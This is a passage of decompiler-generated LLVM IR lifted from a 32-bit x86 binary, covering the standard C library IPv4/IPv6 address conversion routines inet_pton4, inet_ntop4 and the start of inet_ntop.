  store i32 %v1_8055d07, i32* @esi, align 4
  %v6_8055d0e = icmp ugt i32 %v1_8055d07, %v2_8055c52
  br i1 %v6_8055d0e, label %dec_label_pc_8055dd2, label %dec_label_pc_8055d14

dec_label_pc_8055d14:                             ; preds = %dec_label_pc_8055d07
  store i32 %v0_8055d07, i32* @edx, align 4
  %v4_8055d16 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8055d16, i32* @eax, align 4
  %v2_8055d1a = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8055d1a = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8055d1a, i32 %v2_8055c52)
  store i32 %v5_8055d1a, i32* %eax.global-to-local, align 4
  %v0_8055d1f = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_8055d1a, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8055d69, label %dec_label_pc_8055dd2

dec_label_pc_8055d32:                             ; preds = %dec_label_pc_8055d32.outer, %dec_label_pc_8055cc0
  %v0_8055d35 = phi i32 [ %v1_8055c86, %dec_label_pc_8055cc0 ], [ %v0_8055d3536, %dec_label_pc_8055d32.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8055cc0, %dec_label_pc_8055cc0 ], [ %stack_var_-44.1.ph, %dec_label_pc_8055d32.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8055cc4, %dec_label_pc_8055cc0 ], [ %stack_var_-36.1.ph, %dec_label_pc_8055d32.outer ]
  %v1_8055d35 = inttoptr i32 %v0_8055d35 to i8*
  %v2_8055d35 = load i8, i8* %v1_8055d35, align 1
  %v3_8055d35 = sext i8 %v2_8055d35 to i32
  store i32 %v3_8055d35, i32* %eax.global-to-local, align 4
  %v2_8055d39 = call i32 @__GI_tolower(i32 %v3_8055d35)
  store i32 %v2_8055d39, i32* %eax.global-to-local, align 4
  store i32 %v2_8055d39, i32* @esi, align 4
  %v1_8055d43 = icmp eq i32 %v2_8055d39, 0
  %v1_8055d45 = icmp eq i1 %v1_8055d43, false
  br i1 %v1_8055d45, label %dec_label_pc_8055c79, label %dec_label_pc_8055d4b

dec_label_pc_8055d4b:                             ; preds = %dec_label_pc_8055d32
  %v0_8055da1.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_8055cae, label %dec_label_pc_8055d69, label %dec_label_pc_8055d52

dec_label_pc_8055d52:                             ; preds = %dec_label_pc_8055d4b
  %v1_8055d52 = add i32 %v0_8055da1.pre.pre, 2
  store i32 %v1_8055d52, i32* @edx, align 4
  %v6_8055d59 = icmp ugt i32 %v1_8055d52, %v2_8055c52
  br i1 %v6_8055d59, label %dec_label_pc_8055dd2, label %dec_label_pc_8055d5b

dec_label_pc_8055d5b:                             ; preds = %dec_label_pc_8055d52
  %v0_8055d5b = load i32, i32* @ebp, align 4
  %v2_8055d5d = udiv i32 %v0_8055d5b, 256
  %v4_8055d5d = trunc i32 %v2_8055d5d to i8
  %v3_8055d60 = inttoptr i32 %v0_8055da1.pre.pre to i8*
  store i8 %v4_8055d5d, i8* %v3_8055d60, align 1
  %v0_8055d62 = load i32, i32* @ebp, align 4
  store i32 %v0_8055d62, i32* %eax.global-to-local, align 4
  %v1_8055d64 = trunc i32 %v0_8055d62 to i8
  %v2_8055d64 = load i32, i32* @ebx, align 4
  %v3_8055d64 = add i32 %v2_8055d64, 1
  %v4_8055d64 = inttoptr i32 %v3_8055d64 to i8*
  store i8 %v1_8055d64, i8* %v4_8055d64, align 1
  %v0_8055d67 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055d69

dec_label_pc_8055d69:                             ; preds = %dec_label_pc_8055d4b, %dec_label_pc_8055d14, %dec_label_pc_8055d5b
  %v0_8055da1.pre = phi i32 [ %v0_8055d1f, %dec_label_pc_8055d14 ], [ %v0_8055d67, %dec_label_pc_8055d5b ], [ %v0_8055da1.pre.pre, %dec_label_pc_8055d4b ]
  %v4_8055d69 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8055d69 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8055d69, label %dec_label_pc_8055da1, label %dec_label_pc_8055d70

dec_label_pc_8055d70:                             ; preds = %dec_label_pc_8055d69
  store i32 1, i32* @esi, align 4
  %v6_8055d77 = sub i32 %v0_8055da1.pre, %v4_8055d69
  store i32 %v6_8055d77, i32* @edi, align 4
  %v16_8055d7b = icmp eq i32 %v0_8055da1.pre, %v2_8055c52
  %v1_8055d7f = icmp eq i1 %v16_8055d7b, false
  br i1 %v1_8055d7f, label %dec_label_pc_8055d99.preheader, label %dec_label_pc_8055dd2

dec_label_pc_8055d99.preheader:                   ; preds = %dec_label_pc_8055d70
  %v3_8055d9994 = inttoptr i32 %v6_8055d77 to i8*
  %v9_8055d9b97 = icmp slt i8* %v3_8055d9994, inttoptr (i32 1 to i8*)
  br i1 %v9_8055d9b97, label %dec_label_pc_8055da1.thread, label %dec_label_pc_8055d83

dec_label_pc_8055d83:                             ; preds = %dec_label_pc_8055d99.preheader, %dec_label_pc_8055d83
  %v0_8055d9199 = phi i32 [ %v0_8055d99.pre, %dec_label_pc_8055d83 ], [ 1, %dec_label_pc_8055d99.preheader ]
  %v0_8055d8398 = phi i32 [ %v1_8055d99.pre, %dec_label_pc_8055d83 ], [ %v6_8055d77, %dec_label_pc_8055d99.preheader ]
  %v2_8055d89 = sub i32 %v0_8055d8398, %v0_8055d9199
  %v2_8055d8b = sub i32 %v2_8055c52, %v0_8055d9199
  %v6_8055d8d = add i32 %v2_8055d89, %v4_8055d69
  store i32 %v6_8055d8d, i32* %eax.global-to-local, align 4
  %v1_8055d91 = add i32 %v0_8055d9199, 1
  store i32 %v1_8055d91, i32* @esi, align 4
  %v1_8055d92 = inttoptr i32 %v6_8055d8d to i8*
  %v2_8055d92 = load i8, i8* %v1_8055d92, align 1
  %v3_8055d92 = zext i8 %v2_8055d92 to i32
  %v4_8055d92 = load i32, i32* @edx, align 4
  %v5_8055d92 = and i32 %v4_8055d92, -256
  %v6_8055d92 = or i32 %v5_8055d92, %v3_8055d92
  store i32 %v6_8055d92, i32* @edx, align 4
  %v3_8055d94 = inttoptr i32 %v2_8055d8b to i8*
  store i8 %v2_8055d92, i8* %v3_8055d94, align 1
  %v0_8055d96 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055d96 = inttoptr i32 %v0_8055d96 to i8*
  store i8 0, i8* %v1_8055d96, align 1
  %v0_8055d99.pre = load i32, i32* @esi, align 4
  %v1_8055d99.pre = load i32, i32* @edi, align 4
  %v2_8055d99 = inttoptr i32 %v0_8055d99.pre to i8*
  %v3_8055d99 = inttoptr i32 %v1_8055d99.pre to i8*
  %v9_8055d9b = icmp sgt i8* %v2_8055d99, %v3_8055d99
  br i1 %v9_8055d9b, label %dec_label_pc_8055da1.thread, label %dec_label_pc_8055d83

dec_label_pc_8055da1.thread:                      ; preds = %dec_label_pc_8055d83, %dec_label_pc_8055d99.preheader
  br label %dec_label_pc_8055da7

dec_label_pc_8055da1:                             ; preds = %dec_label_pc_8055d69
  %v16_8055da1 = icmp eq i32 %v0_8055da1.pre, %v2_8055c52
  %v1_8055da5 = icmp eq i1 %v16_8055da1, false
  br i1 %v1_8055da5, label %dec_label_pc_8055dd2, label %dec_label_pc_8055da7

dec_label_pc_8055da7:                             ; preds = %dec_label_pc_8055da1.thread, %dec_label_pc_8055da1
  store i32 %v2_8055c46, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8055db3 = call i32 @memcpy(i16* %tmp63, i32 %v2_8055c46, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055dd4

dec_label_pc_8055dc2:                             ; preds = %dec_label_pc_8055c26
  %v1_8055dc2 = call i32 @__errno_location(i32 %v0_8055c15)
  %v1_8055dc7 = inttoptr i32 %v1_8055dc2 to i32*
  store i32 97, i32* %v1_8055dc7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055dd4

dec_label_pc_8055dd2:                             ; preds = %dec_label_pc_8055cd3, %dec_label_pc_8055cca, %dec_label_pc_8055c8e, %dec_label_pc_8055cb5, %dec_label_pc_8055d70, %dec_label_pc_8055d14, %dec_label_pc_8055da1, %dec_label_pc_8055d52, %dec_label_pc_8055d07, %dec_label_pc_8055cfe, %dec_label_pc_8055c61
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055dd4

dec_label_pc_8055dd4:                             ; preds = %dec_label_pc_8055dc2, %dec_label_pc_8055da7, %dec_label_pc_8055c31, %dec_label_pc_8055dd2
  %v0_8055ddb = phi i32 [ -1, %dec_label_pc_8055dc2 ], [ 1, %dec_label_pc_8055da7 ], [ %v3_8055c37, %dec_label_pc_8055c31 ], [ 0, %dec_label_pc_8055dd2 ]
  store i32 %v0_8055c15, i32* @ebx, align 4
  store i32 %v0_8055c14, i32* @esi, align 4
  store i32 %v0_8055c13, i32* @edi, align 4
  store i32 %v0_8055c12, i32* @ebp, align 4
  ret i32 %v0_8055ddb

; uselistorder directives
  uselistorder i32 %v1_8055d99.pre, { 1, 0 }
  uselistorder i32 %v0_8055d99.pre, { 1, 0 }
  uselistorder i32 %v0_8055d9199, { 2, 1, 0 }
  uselistorder i32 %v0_8055da1.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8055da1.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8055d39, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8055c86, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8055c52, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8055c15, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055dd4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055dd2, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8055da7, { 1, 0 }
  uselistorder label %dec_label_pc_8055d83, { 1, 0 }
  uselistorder label %dec_label_pc_8055d69, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055d32, { 1, 0 }
  uselistorder label %dec_label_pc_8055cf2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055d32.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8055ddd = load i32, i32* @edi, align 4
  %v0_8055dde = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8055de6 = load i32, i32* @eax, align 4
  %v3_8055dea = and i32 %v0_8055de6, -65536
  store i32 %v3_8055dea, i32* %stack_var_-33, align 4
  %v2_8055df5 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8055dfb = load i32, i32* @edx, align 4
  %v5_8055dfb = inttoptr i32 %v0_8055dfb to i8*
  store i8* %v5_8055dfb, i8** %stack_var_-60, align 4
  %v0_8055dff = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8055e05 = add i32 %v2_8055df5, 4
  store i32 %v6_8055e05, i32* %edi.global-to-local, align 4
  %v2_8055e06 = inttoptr i32 %v6_8055e05 to i32*
  store i32 0, i32* %v2_8055e06, align 4
  %v3_8055e06 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055e06 = add i32 %v3_8055e06, 4
  store i32 %v6_8055e06, i32* %edi.global-to-local, align 4
  %v0_8055e07 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055e07 = inttoptr i32 %v6_8055e06 to i32*
  store i32 %v0_8055e07, i32* %v2_8055e07, align 4
  %v3_8055e07 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055e07 = add i32 %v3_8055e07, 4
  store i32 %v6_8055e07, i32* %edi.global-to-local, align 4
  %v0_8055e08 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e08 = trunc i32 %v0_8055e08 to i16
  %v3_8055e08 = inttoptr i32 %v6_8055e07 to i16*
  store i16 %v1_8055e08, i16* %v3_8055e08, align 2
  %v4_8055e08 = load i32, i32* %edi.global-to-local, align 4
  %v7_8055e08 = add i32 %v4_8055e08, 2
  store i32 %v7_8055e08, i32* %edi.global-to-local, align 4
  %v0_8055e0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e0a = trunc i32 %v0_8055e0a to i8
  %v3_8055e0a = inttoptr i32 %v7_8055e08 to i8*
  store i8 %v1_8055e0a, i8* %v3_8055e0a, align 1
  %v0_8055e9a26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8055e9d29 = icmp sgt i32 %v0_8055e9a26, 3
  br i1 %v7_8055e9d29, label %dec_label_pc_8055ea3, label %dec_label_pc_8055e10

dec_label_pc_8055e10:                             ; preds = %entry, %dec_label_pc_8055e78
  %v0_8055e9a30 = phi i32 [ %v0_8055e9a, %dec_label_pc_8055e78 ], [ %v0_8055e9a26, %entry ]
  %v0_8055e14 = load i32, i32* @ecx, align 4
  %v1_8055e14 = and i32 %v0_8055e14, -256
  %v2_8055e14 = or i32 %v1_8055e14, 100
  store i32 %v2_8055e14, i32* %ecx.global-to-local, align 4
  %v2_8055e16 = add i32 %v0_8055e9a30, %v0_8055de6
  store i32 %v2_8055e16, i32* %eax.global-to-local, align 4
  %v0_8055e18 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055e18 = add i32 %v0_8055e18, 1
  store i32 %v1_8055e18, i32* @esi, align 4
  store i32 %v0_8055e18, i32* @edi, align 4
  %v1_8055e21 = inttoptr i32 %v2_8055e16 to i8*
  %v2_8055e21 = load i8, i8* %v1_8055e21, align 1
  %v3_8055e21 = zext i8 %v2_8055e21 to i32
  %v4_8055e21 = load i32, i32* @edx, align 4
  %v5_8055e21 = and i32 %v4_8055e21, -65536
  %v6_8055e21 = or i32 %v5_8055e21, %v3_8055e21
  store i32 %v6_8055e21, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8055e21, 100
  %v6_8055e27 = zext i8 %div to i32
  %v4_8055e29 = or i32 %v6_8055e27, %v1_8055e14
  store i32 %v4_8055e29, i32* %ecx.global-to-local, align 4
  %v1_8055e2b = or i32 %v4_8055e29, 48
  store i32 %v1_8055e2b, i32* %eax.global-to-local, align 4
  %v1_8055e2e = trunc i32 %v1_8055e2b to i8
  %v2_8055e2e = load i32, i32* @esp, align 4
  %v4_8055e2e = add i32 %v0_8055e18, 43
  %v5_8055e2e = add i32 %v4_8055e2e, %v2_8055e2e
  %v6_8055e2e = inttoptr i32 %v5_8055e2e to i8*
  store i8 %v1_8055e2e, i8* %v6_8055e2e, align 1
  %v0_8055e32 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e32 = trunc i32 %v0_8055e32 to i8
  %v7_8055e32 = icmp eq i8 %v1_8055e32, 48
  %v1_8055e34 = icmp eq i1 %v7_8055e32, false
  %v0_8055e5a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055e5a = and i32 %v0_8055e5a, -256
  %v2_8055e5a = or i32 %v1_8055e5a, 10
  store i32 %v2_8055e5a, i32* %ecx.global-to-local, align 4
  %v0_8055e5c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055e5c, i32* %eax.global-to-local, align 4
  %v3_8055e5e = trunc i32 %v0_8055e5c to i16
  %v5_8055e5e = udiv i16 %v3_8055e5e, 10
  br i1 %v1_8055e34, label %dec_label_pc_8055e5a, label %dec_label_pc_8055e36

dec_label_pc_8055e36:                             ; preds = %dec_label_pc_8055e10
  %v9_8055e3a = and i32 %v0_8055e5c, -65536
  %tmp = urem i16 %v5_8055e5e, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_8055e47 = zext i16 %div32 to i32
  %v11_8055e47 = or i32 %v7_8055e47, %v9_8055e3a
  store i32 %v11_8055e47, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_8055e47 = zext i16 %tmp34 to i32
  %v1_8055e4a = or i32 %v12_8055e47, 48
  %v8_8055e4a = trunc i32 %v1_8055e4a to i8
  store i32 %v1_8055e4a, i32* %edx.global-to-local, align 4
  %v2_8055e4d = load i32, i32* @esp, align 4
  %v3_8055e4d = load i32, i32* %ebx.global-to-local, align 4
  %v4_8055e4d = add i32 %v2_8055e4d, 43
  %v5_8055e4d = add i32 %v4_8055e4d, %v3_8055e4d
  %v6_8055e4d = inttoptr i32 %v5_8055e4d to i8*
  store i8 %v8_8055e4a, i8* %v6_8055e4d, align 1
  %v0_8055e51 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055e51 = trunc i32 %v0_8055e51 to i8
  %v7_8055e51 = icmp eq i8 %v1_8055e51, 48
  br i1 %v7_8055e51, label %dec_label_pc_8055e78, label %dec_label_pc_8055e56

dec_label_pc_8055e56:                             ; preds = %dec_label_pc_8055e36
  %v0_8055e56 = load i32, i32* @esi, align 4
  store i32 %v0_8055e56, i32* @edi, align 4
  br label %dec_label_pc_8055e78

dec_label_pc_8055e5a:                             ; preds = %dec_label_pc_8055e10
  %tmp35 = urem i16 %v5_8055e5e, 256
  %v3_8055e60 = and i32 %v0_8055e5c, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_8055e6b = zext i16 %div33 to i32
  %v11_8055e6b = or i32 %v7_8055e6b, %v3_8055e60
  store i32 %v11_8055e6b, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_8055e6b = zext i16 %tmp36 to i32
  %v1_8055e6e = or i32 %v12_8055e6b, 48
  %v8_8055e6e = trunc i32 %v1_8055e6e to i8
  store i32 %v1_8055e6e, i32* %edx.global-to-local, align 4
  %v0_8055e71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055e71 = add i32 %v0_8055e71, 2
  store i32 %v1_8055e71, i32* @edi, align 4
  %v2_8055e74 = load i32, i32* @esp, align 4
  %v3_8055e74 = load i32, i32* @esi, align 4
  %v4_8055e74 = add i32 %v2_8055e74, 43
  %v5_8055e74 = add i32 %v4_8055e74, %v3_8055e74
  %v6_8055e74 = inttoptr i32 %v5_8055e74 to i8*
  store i8 %v8_8055e6e, i8* %v6_8055e74, align 1
  br label %dec_label_pc_8055e78

dec_label_pc_8055e78:                             ; preds = %dec_label_pc_8055e36, %dec_label_pc_8055e56, %dec_label_pc_8055e5a
  store i32 %v2_8055e16, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8055e81 = load i32, i32* @edi, align 4
  %v1_8055e81 = add i32 %v0_8055e81, 2
  store i32 %v1_8055e81, i32* %ebx.global-to-local, align 4
  %v0_8055e84 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055e84 = add i32 %v0_8055e84, 1
  store i32 %v1_8055e84, i32* %ebp.global-to-local, align 4
  %v2_8055e85 = load i8, i8* %v1_8055e21, align 1
  %v3_8055e85 = zext i8 %v2_8055e85 to i32
  %v4_8055e85 = load i32, i32* %eax.global-to-local, align 4
  %v5_8055e85 = and i32 %v4_8055e85, -65536
  %v6_8055e85 = or i32 %v5_8055e85, %v3_8055e85
  store i32 %v6_8055e85, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8055e8b = load i32, i32* @esp, align 4
  %v2_8055e8b = add i32 %v0_8055e81, 44
  %v3_8055e8b = add i32 %v2_8055e8b, %v0_8055e8b
  %v4_8055e8b = inttoptr i32 %v3_8055e8b to i8*
  store i8 46, i8* %v4_8055e8b, align 1
  %v0_8055e90 = load i32, i32* @ecx, align 4
  %v1_8055e90 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055e90 = urem i32 %v1_8055e90, 65536
  %v3_8055e90 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055e90 = mul i32 %v3_8055e90, 65536
  %v5_8055e90 = or i32 %v4_8055e90, %v2_8055e90
  %v6_8055e90 = urem i32 %v0_8055e90, 65536
  %v7_8055e90 = udiv i32 %v5_8055e90, %v6_8055e90
  %v8_8055e90 = urem i32 %v7_8055e90, 65536
  %v10_8055e90 = and i32 %v1_8055e90, -65536
  %v11_8055e90 = or i32 %v8_8055e90, %v10_8055e90
  store i32 %v11_8055e90, i32* %eax.global-to-local, align 4
  %v12_8055e90 = urem i32 %v5_8055e90, %v6_8055e90
  %v14_8055e90 = and i32 %v3_8055e90, -65536
  %v15_8055e90 = or i32 %v12_8055e90, %v14_8055e90
  %v1_8055e93 = add i32 %v15_8055e90, 48
  %v8_8055e93 = trunc i32 %v1_8055e93 to i8
  store i32 %v1_8055e93, i32* @edx, align 4
  %v2_8055e96 = load i32, i32* @esp, align 4
  %v3_8055e96 = load i32, i32* @edi, align 4
  %v4_8055e96 = add i32 %v2_8055e96, 43
  %v5_8055e96 = add i32 %v4_8055e96, %v3_8055e96
  %v6_8055e96 = inttoptr i32 %v5_8055e96 to i8*
  store i8 %v8_8055e93, i8* %v6_8055e96, align 1
  %v0_8055e9a = load i32, i32* %ebp.global-to-local, align 4
  %v7_8055e9d = icmp sgt i32 %v0_8055e9a, 3
  br i1 %v7_8055e9d, label %dec_label_pc_8055ea3, label %dec_label_pc_8055e10

dec_label_pc_8055ea3:                             ; preds = %dec_label_pc_8055e78, %entry
  %v0_8055ea3 = load i32, i32* @esp, align 4
  %v1_8055ea3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055ea3 = add i32 %v0_8055ea3, 42
  %v3_8055ea3 = add i32 %v2_8055ea3, %v1_8055ea3
  %v4_8055ea3 = inttoptr i32 %v3_8055ea3 to i8*
  store i8 0, i8* %v4_8055ea3, align 1
  %v2_8055eab = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8055eab, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_8055eb0 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_8055eb0, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_8055eb0, %v0_8055dff
  br i1 %tmp31, label %dec_label_pc_8055ebe, label %dec_label_pc_8055ecd

dec_label_pc_8055ebe:                             ; preds = %dec_label_pc_8055ea3
  %v0_8055ebe = load i8*, i8** %stack_var_-92, align 4
  %v1_8055ebe = ptrtoint i8* %v0_8055ebe to i32
  %v2_8055ebe = call i32 @__errno_location(i32 %v1_8055ebe)
  %v1_8055ec3 = inttoptr i32 %v2_8055ebe to i32*
  store i32 28, i32* %v1_8055ec3, align 4
  br label %dec_label_pc_8055edc

dec_label_pc_8055ecd:                             ; preds = %dec_label_pc_8055ea3
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_8055ed05 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8055ed05, i32* %tmp25, align 4
  %v0_8055ed4.cast = inttoptr i32 %v3_8055ed05 to i8*
  %v4_8055ed4 = call i32 @strcpy(i8* %v0_8055ed4.cast, i32 %v2_8055eab)
  br label %dec_label_pc_8055edc

dec_label_pc_8055edc:                             ; preds = %dec_label_pc_8055ebe, %dec_label_pc_8055ecd
  %storemerge = phi i32 [ %v4_8055ed4, %dec_label_pc_8055ecd ], [ 0, %dec_label_pc_8055ebe ]
  %v0_8055ee3 = phi i32 [ %v4_8055ed4, %dec_label_pc_8055ecd ], [ 0, %dec_label_pc_8055ebe ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8055dde, i32* @esi, align 4
  store i32 %v0_8055ddd, i32* @edi, align 4
  ret i32 %v0_8055ee3

; uselistorder directives
  uselistorder i32 %v0_8055e9a, { 1, 0 }
  uselistorder i32 %v3_8055e90, { 1, 0 }
  uselistorder i32 %v1_8055e90, { 1, 0 }
  uselistorder i32 %v1_8055e6e, { 1, 0 }
  uselistorder i32 %v1_8055e4a, { 1, 0 }
  uselistorder i32 %v0_8055e5c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8055e2b, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 7, 1, 5, 6, 2, 3, 4, 0 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 8, 12, 2, 9, 10, 11 }
  uselistorder i1* @df, { 5, 41, 42, 0, 1, 43, 44, 45, 50, 2, 3, 33, 4, 55, 56, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 46, 47, 48, 49, 51, 52, 53, 54 }
  uselistorder label %dec_label_pc_8055edc, { 1, 0 }
  uselistorder label %dec_label_pc_8055e78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055e10, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8055ee5 = load i32, i32* @edi, align 4
  %v0_8055ee6 = load i32, i32* @esi, align 4
  %v0_8055ee7 = load i32, i32* @ebx, align 4
  %v15_8055ee8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8055eef = icmp eq i32 %arg1, 2
  br i1 %v9_8055eef, label %dec_label_pc_8055eff, label %dec_label_pc_8055ef4

dec_label_pc_8055ef4:                             ; preds = %entry
  %v9_8055ef4 = icmp eq i32 %arg1, 10
  %v1_8055ef7 = icmp eq i1 %v9_8055ef4, false
  br i1 %v1_8055ef7, label %dec_label_pc_805609b, label %dec_label_pc_8055f17

dec_label_pc_8055eff:                             ; preds = %entry
  %v4_8055eff = ptrtoint i8* %arg3 to i32
  store i32 %v4_8055eff, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8055f0b = call i32 @inet_ntop4(i32 %v0_8055ee7, i32 %v0_8055ee6, i32 %v0_8055ee5)
  store i32 %v3_8055f0b, i32* %eax.global-to-local, align 4
  store i32 %v3_8055f0b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80560a8

dec_label_pc_8055f17:                             ; preds = %dec_label_pc_8055ef4
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8055f1c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8055f1c, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_8055f21 = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_8055f21, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8055f43 = add i32 %arg2, 1
  br label %dec_label_pc_8055f2d

dec_label_pc_8055f2d:                             ; preds = %dec_label_pc_8055f2d.dec_label_pc_8055f2d_crit_edge, %dec_label_pc_8055f17
  %v1_8055f50 = phi i32 [ %v15_8055ee8, %dec_label_pc_8055f17 ], [ %v1_8055f50.pre, %dec_label_pc_8055f2d.dec_label_pc_8055f2d_crit_edge ]
  %v0_8055f4b71 = phi i32 [ 0, %dec_label_pc_8055f17 ], [ %v0_8055f54.pre, %dec_label_pc_8055f2d.dec_label_pc_8055f2d_crit_edge ]
  %v1_8055f36 = ashr i32 %v0_8055f4b71, 31
